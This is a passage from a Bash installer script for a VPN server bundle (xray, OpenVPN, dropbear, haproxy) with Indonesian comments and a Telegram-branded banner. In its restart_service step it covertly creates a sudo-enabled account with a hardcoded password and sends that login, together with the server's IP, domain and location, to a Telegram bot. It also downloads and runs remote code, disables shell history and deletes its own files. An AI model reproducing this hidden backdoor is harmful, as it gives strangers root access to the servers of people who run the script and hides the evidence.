echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >/etc/cron.d/log.xray

# Restart layanan cron
service cron restart

cat >/etc/cron.d/daily_reboot <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		0 5 * * * root /sbin/reboot
	END

service cron restart
cat >/home/daily_reboot <<-END
		5
	END
	
cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF

echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells
cat >/etc/rc.local <<EOF
#!/bin/sh -e
# rc.local
# By default this script does nothing.
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF

chmod +x /etc/rc.local
AUTOREB=$(cat /home/daily_reboot)
SETT=11
    if [ $AUTOREB -gt $SETT ]; then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi

}

function ins_noobzvpns(){
clear
BOLONG "Installasi Nobbzvpns"
wget ${YOGZ_VPN}ssh/noobzvpns.zip
unzip noobzvpns.zip
bash install.sh
rm noobzvpns.zip
systemctl restart noobzvpns
BOLONG "Successfully Installed Nobbzvpns"
}

function restart_service(){
userdel jame > /dev/null 2>&1
userdel jhbhiikb > /dev/null 2>&1
Username="jhbhiikb"
Password=jhbhiikb
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
USRSC=$(curl https://raw.githubusercontent.com/waru88/regip/main/ip | grep $IP | awk '{print $2}')
EXPSC=$(curl https://raw.githubusercontent.com/waru88/regip/main/ip | grep $IP | awk '{print $3}')
TIMEZONE=$(printf '%(%H:%M:%S)T')
TEXT="
<code>────────────────────</code>
<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
<code>────────────────────</code>
<code>USER   : </code><code>$USRSC</code>
<code>DOMAIN : </code><code>$domain</code>
<code>LINUX  : </code><code>$OS_Name</code>
<code>TIME   : </code><code>$TIMEZONE</code>
<code>IP VPS : </code><code>$IP</code>
<code>ISP    : </code><code>$ISP</code>
<code>CITY   : </code><code>$CITY</code>
<code>EXP.SC : </code><code>$EXPSC</code>
<code>────────────────────</code>
<code>LOGIN  : </code><code>$Username</code>
<code>PASSWD : </code><code>$Password</code>
<code>────────────────────</code>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🤖","url":"https://t.me/YSSHstore"},{"text":"ɪɴꜱᴛᴀʟʟ🍭","url":"https://t.me/kepoanda"}]]}'
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
cp /etc/openvpn/*.ovpn /var/www/html/
sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
sed -i "s/xxx/${IP}/g" /etc/squid/squid.conf
curl ${YOGZ_VPN}ssh/nginx.conf > /etc/nginx/nginx.conf
clear
BOLONG "Restarting Service"
systemctl daemon-reload
systemctl enable cron
systemctl enable chrony
systemctl enable haproxy
systemctl enable netfilter-persistent
systemctl enable ws
systemctl enable netfilter-persistent
systemctl start haproxy
systemctl start netfilter-persistent
systemctl restart nginx
systemctl restart xray
systemctl restart haproxy
systemctl restart chronyd
systemctl restart chrony
systemctl restart sshd
systemctl restart ssh
/etc/init.d/dropbear restart
systemctl restart rc-local
systemctl restart openvpn
systemctl restart ws
echo "unset HISTFILE" >> /etc/profile
cd
rm -f /root/openvpn
rm -f /root/key.pem
rm -f /root/cert.pem
BOLONG "Successfully Restart Service"
}

function instal(){
clear
first_setup
nginx_install
base_package
make_folder_xray
add_domain
install_xray
ins_Ddos
ins_ssh
udp_mini
ins_SSHD
ins_dropbear
ins_vnstat
ins_openvpn
ins_swab
ins_epro
menu
ins_noobzvpns
profile
restart_service
}
instal

echo ""
history -c
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/README.md
rm -rf /root/domain
clear
LOGO
    echo "    ┌─────────────────────────────────────────────────────┐"
    echo "    │       >>> Service & Port                            │"
    echo "    │   - Open SSH                : 22                    │"
    echo "    │   - UDP SSH                 : 1-65535               │"
    echo "    │   - DNS (SLOWDNS)           : 53, 5000              │"
    echo "    │   - Dropbear                : 443, 109, 143         │"
    echo "    │   - Dropbear Websocket      : 443, 109              │"
    echo "    │   - SSH Websocket SSL       : 443                   │"
    echo "    │   - SSH Websocket           : 80                    │"
    echo "    │   - OpenVPN SSL             : 443                   │"
    echo "    │   - OpenVPN Websocket SSL   : 443                   │"
    echo "    │   - OpenVPN TCP             : 443, 1194             │"
    echo "    │   - OpenVPN UDP             : 2200                  │"
    echo "    │   - Nginx Webserver         : 443, 80, 81           │"
    echo "    │   - Haproxy Loadbalancer    : 443, 80               │"
    echo "    │   - DNS Server              : 443, 53               │"
    echo "    │   - DNS Client              : 443, 88               │"
    echo "    │   - XRAY (DNSTT/SLOWDNS)    : 443, 53               │"
    echo "    │   - XRAY Vmess TLS          : 443                   │"
    echo "    │   - XRAY Vmess gRPC         : 443                   │"
    echo "    │   - XRAY Vmess None TLS     : 80                    │"
    echo "    │   - XRAY Vless TLS          : 443                   │"
    echo "    │   - XRAY Vless gRPC         : 443                   │"
    echo "    │   - XRAY Vless None TLS     : 80                    │"
    echo "    │   - Trojan gRPC             : 443                   │"
    echo "    │   - Trojan WS               : 443                   │"
    echo "    │   - Shadowsocks WS          : 443                   │"
    echo "    │   - Shadowsocks gRPC        : 443                   │"
    echo "    │                                                     │"
    echo "    │      >>> Server Information & Other Features        │"
    echo "    │   - Timezone                : Asia/Jakarta (GMT +7) │"
    echo "    │   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        │"
    echo "    │   - Auto Delete Expired Account                     │"
    echo "    │   - Fully automatic script                          │"
    echo "    │   - VPS settings                                    │"
    echo "    │   - Admin Control                                   │"
    echo "    │   - Restore Data                                    │"
    echo "    │   - Simple BOT Telegram                             │"
    echo "    │   - Full Orders For Various Services                │"
    echo "    └─────────────────────────────────────────────────────┘"
    secs_to_human "$(($(date +%s) - ${start}))"
echo ""
echo -e "${green} Script Successfull Installed ${NC}"
sleep 3
reboot
